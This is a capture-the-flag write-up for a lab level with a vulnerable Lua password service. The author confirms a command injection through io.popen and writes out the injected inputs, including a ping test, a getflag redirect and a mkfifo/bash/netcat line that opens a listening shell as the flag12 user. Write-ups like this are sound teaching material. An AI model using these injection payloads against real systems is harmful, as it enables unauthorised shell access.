# level12

## Challenge info

There is a backdoor process listening on port 50001.

```
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password)
  prog = io.popen("echo "..password.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print("trying " .. line) -- log from where ;\
      local h = hash(line)

      if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
          client:send("Better luck next time\n");
      else
          client:send("Congrats, your token is 413**CARRIER LOST**\n")
      end

  end

  client:close()
end
```

## Solution

Since i did not recognized the code syntax, i went online to https://creativetechguy.com/utilities/codedetector and posted the hash() function.

Turns out this is a lua script (and i dont know shit about lua), also if i went to the /home/flag12 and listed the files, the script is there with extension .lua.

I replicated part of the hash() function to see what it does.

Came to the conclusion that the bellow line will create a new process and source the first argument to the console

```
io.popen("echo " ..password.. " | sha1", "r)
```

I went ahed and launched a tcpdum icmp at the local machine and tried to ping it passing

```
Password: a; ping $IP #
```

And it was successfull.

Now, i tried to print the flag to see if it would work (and it did with the owner being flag12)

```
Password: ; getflag > /tmp/flag #
```

Now i wanted a shell so i found one online to make a reverse shell on the restricted netcat (nc) and modified it

```
Password: a; mkfifo /tmp/f2 && /bin/bash 0</tmp/f2 | nc -l 9999 > /tmp/f2 2>&1
```

From local machine

```
nc $IP 9999
whoami
$ flag12
getflag
```

## Flag

```
You have successfully executed getflag on a target account
```